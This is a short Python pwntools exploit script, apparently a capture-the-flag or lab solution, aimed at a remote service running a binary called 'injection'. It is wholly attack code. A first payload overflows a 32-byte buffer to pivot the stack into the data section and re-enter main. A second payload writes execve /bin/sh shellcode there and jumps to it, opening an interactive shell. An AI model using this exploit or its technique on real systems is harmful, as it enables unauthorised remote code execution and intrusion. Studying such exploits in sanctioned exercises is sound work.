from mmap import PAGESIZE
from pwn import *


def align_addr(addr):
	return addr & ~(PAGESIZE - 1)

# From here: https://packetstormsecurity.com/files/154870/Linux-x86-execve-bin-sh-Shellcode.html
sc = b'\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56' +\
	b'\x57\x8d\x1c\x24\xb0\x0b\xcd\x80'

p = remote('141.85.224.99', 41447)
elf = ELF('./injection')


data_section = align_addr(elf.symbols['__data_start']) 

# First stage: pivot the stack to 0x8049020 and recall `main`, but skip its prologue
# Add 0x20 so that [ebp - 0x20] (the buffer for `fgets`) doesn't seg fault.
new_ebp = data_section + 0x20
second_main = elf.symbols['main'] + 0x3  # from objdump: sub esp, 0x20

payload_stage1 =  b'a' * 32 + p32(new_ebp) + p32(second_main)
p.sendline(payload_stage1)

# The shellcode now begins at address `data_section`
# Second stage: fill the new stack with the shellcode and run it.
payload_stage2 = sc + b'a' * (36 - len(sc)) + p32(data_section)
p.sendline(payload_stage2)

p.interactive()
